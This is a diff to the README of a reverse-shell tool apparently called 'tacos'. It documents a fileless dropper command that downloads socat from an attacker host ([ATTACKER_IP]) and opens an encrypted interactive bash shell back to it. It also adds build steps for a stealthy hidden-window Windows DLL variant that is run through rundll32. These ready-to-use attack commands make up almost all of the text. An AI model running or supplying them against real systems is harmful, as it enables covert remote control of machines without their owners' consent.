@@ -97,7 +97,7 @@ make before.build
 make build.tacos          # or make build.tacos.windows
 ```
 
-## Alternative
+## Alternatives
 
 Alternatively, if target does not have `socat`:
 **Host** a [static](https://github.com/minos-org/minos-static/blob/master/static-get) version of `socat` binary and **download + execute it** using the stealthy  [`filess-xec`](https://github.com/ariary/fileless-xec) dropper:
@@ -110,4 +110,14 @@ python3 -m http.server 8080
 # On target machine
 # Use already downloaded fileless-xec to download socat and stealthy launch it with argument
 fileless-xec [ATTACKER_IP]:8080/socat -- exec:'bash -il',pty,stderr,setsid,sigint,sane OPENSSL:[ATTACKER_IP]:443,verify=0
+```
+
+### Use dll instead of `.exe`
+```shell
+# On attacker machine:
+# modify ./cmd/tacosdll/tacosdll.go with the according IP:PORT
+$ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui" -o tacos.dll ./cmd/tacosdll/tacosdll.go
+
+# On remote:
+> rundll32.exe ./tacos.dll,Tacos
 ```
